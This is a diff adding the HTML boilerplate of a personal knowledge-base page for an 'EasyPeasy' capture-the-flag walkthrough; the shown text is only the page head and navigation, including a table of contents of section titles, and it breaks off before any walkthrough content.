@@ -1,0 +1,2941 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Personal catalog for CTFs, programming, math, CS, SWE — with great search.">
+      
+      
+      
+      
+        <link rel="prev" href="../boiler-ctf/">
+      
+      
+        <link rel="next" href="../../crypto/_index/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>EasyPeasy CTF — Full Walkthrough (Ultra‑Educational) - Kareem's Knowledge Base</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.7e37652d.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#tldr" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Kareem&#39;s Knowledge Base" class="md-header__button md-logo" aria-label="Kareem's Knowledge Base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Kareem's Knowledge Base
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              EasyPeasy CTF — Full Walkthrough (Ultra‑Educational)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Tags
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../_index/" class="md-tabs__link">
+          
+  
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../notes/commands/linux/_index/" class="md-tabs__link">
+          
+  
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../swe/tooling/_index/" class="md-tabs__link">
+          
+  
+  
+  SWE
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../math/calculus/_index/" class="md-tabs__link">
+          
+  
+  
+  Math
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ai/ml/_index/" class="md-tabs__link">
+          
+  
+  
+  AI
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../kaggle/competitions/_index/" class="md-tabs__link">
+          
+  
+  
+  Kaggle
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Kareem&#39;s Knowledge Base" class="md-nav__button md-logo" aria-label="Kareem's Knowledge Base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Kareem's Knowledge Base
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tags
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    CTF
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../boiler-ctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Boiler CTF (Joomla + SUID)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    EasyPeasy (Web)
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    EasyPeasy (Web)
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#folder-layout-local-repo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Folder Layout (Local → Repo)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#learning-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      Learning Objectives
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0-rules-lab-hygiene" class="md-nav__link">
+    <span class="md-ellipsis">
+      0) Rules &amp; Lab Hygiene
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      1) Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1) Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-host-discovery-port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1 Host Discovery &amp; Port Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-web-surface-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2 Web Surface Mapping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13-wordlists-content-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3 Wordlists &amp; Content Discovery
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-from-clues-to-credentials-decoding-hashing-101" class="md-nav__link">
+    <span class="md-ellipsis">
+      2) From Clues to Credentials (Decoding &amp; Hashing 101)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2) From Clues to Credentials (Decoding &amp; Hashing 101)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-recognize-encodings-by-eye" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 Recognize Encodings by Eye
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-hash-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 Hash Identification
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-exploitation-turning-findings-into-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      3) Exploitation (Turning Findings into Access)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3) Exploitation (Turning Findings into Access)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-common-web-flows" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 Common Web Flows
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-shell-stabilization" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2 Shell Stabilization
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-privilege-escalation-linux-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      4) Privilege Escalation (Linux Patterns)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4) Privilege Escalation (Linux Patterns)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-suid-capabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1 SUID / Capabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-weak-service-files-cron" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2 Weak Service Files / Cron
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-path-hijacking-insecure-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.3 Path Hijacking / Insecure Scripts
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-post-exploitation-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      5) Post-Exploitation Notes
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cheat-sheet-reusable" class="md-nav__link">
+    <span class="md-ellipsis">
+      6) Cheat Sheet (Reusable)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-run-log-your-original-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      7) Run Log (Your Original Notes)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-afteraction-review-aar" class="md-nav__link">
+    <span class="md-ellipsis">
+      8) After‑Action Review (AAR)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#appendix-a-quick-theory-nuggets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Appendix A — Quick Theory Nuggets
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Appendix A — Quick Theory Nuggets">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a1-setuid-in-one-minute" class="md-nav__link">
+    <span class="md-ellipsis">
+      A.1 Setuid in One Minute
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a2-why-sc-sv" class="md-nav__link">
+    <span class="md-ellipsis">
+      A.2 Why -sC -sV?
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credits
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Crypto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pwn/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pwn
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reversing/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reversing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../forensics/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forensics
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../osint/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSINT
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../stego/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Stego
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Commands
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            Commands
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/commands/linux/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/commands/windows/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/commands/docker/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Docker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/commands/kubernetes/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kubernetes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/commands/cloud/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cloud
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    SWE
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            SWE
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../swe/tooling/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tooling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../swe/testing/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../swe/python/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Python
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../swe/cpp/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    C++
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../swe/algorithms/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Algorithms
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../swe/data-structures/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Data Structures
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Math
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Math
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../math/calculus/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Calculus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../math/linear-algebra/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linear Algebra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../math/probability/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Probability
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../math/statistics/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Statistics
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../math/discrete/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Discrete
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    AI
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            AI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/ml/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ML
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/dl/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DL
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/nlp/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NLP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/rl/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RL
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/cv/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CV
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/optimization/_index/" class="md-nav__link">
+        
